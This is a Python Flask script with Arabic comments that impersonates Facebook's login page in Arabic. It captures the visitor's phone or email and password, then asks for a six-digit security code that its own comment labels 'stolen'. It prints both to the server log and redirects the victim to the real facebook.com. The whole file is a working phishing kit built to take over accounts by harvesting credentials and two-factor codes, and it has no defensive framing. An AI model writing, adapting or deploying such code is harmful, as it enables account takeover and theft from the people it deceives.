from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# الصفحة الأولى: المودباس
html_step1 = """
<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Facebook</title></head>
<body style="background:#f0f2f5;display:flex;justify-content:center;padding-top:50px;font-family:sans-serif;">
<div style="background:white;padding:20px;border-radius:8px;width:330px;box-shadow:0 2px 4px rgba(0,0,0,0.1);text-align:center;">
<h1 style="color:#1877f2;">facebook</h1>
<form action="/step2" method="POST">
<input type="text" name="u" placeholder="الهاتف أو البريد" style="width:100%;padding:12px;margin-bottom:10px;border:1px solid #ddd;border-radius:6px;" required>
<input type="password" name="p" placeholder="كلمة السر" style="width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;border-radius:6px;" required>
<button style="width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-weight:bold;">تسجيل الدخول</button>
</form></div></body></html>
"""

# الصفحة الثانية: طلب الرمز
html_step2 = """
<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تأكيد الهوية</title></head>
<body style="background:#f0f2f5;display:flex;justify-content:center;padding-top:50px;font-family:sans-serif;">
<div style="background:white;padding:20px;border-radius:8px;width:330px;box-shadow:0 2px 4px rgba(0,0,0,0.1);text-align:center;">
<h3 style="color:#4b4f56;">أدخل رمز الأمان</h3>
<p style="font-size:14px;color:#606770;">لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك. يرجى إدخاله للمتابعة.</p>
<form action="/final" method="POST">
<input type="hidden" name="user_info" value="{{info}}">
<input type="text" name="code" placeholder="رمز التأكيد (6 أرقام)" style="width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;border-radius:6px;" required>
<button style="width:100%;padding:12px;background:#42b72a;color:white;border:none;border-radius:6px;font-weight:bold;">تأكيد الرمز</button>
</form></div></body></html>
"""

@app.route('/')
def home(): return render_template_string(html_step1)

@app.route('/step2', methods=['POST'])
def step2():
    u, p = request.form.get('u'), request.form.get('p')
    # حفظ المودباس أولاً في الـ Logs
    print(f"\\n[PHASE 1] 👤: {u} | 🔑: {p}\\n")
    return render_template_string(html_step2, info=f"{u}:{p}")

@app.route('/final', methods=['POST'])
def final():
    code = request.form.get('code')
    info = request.form.get('user_info')
    # استلام الرمز لايف
    print(f"\\n[PHASE 2] 🎯 الرمز المسروق: {code} (للحساب: {info})\\n")
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
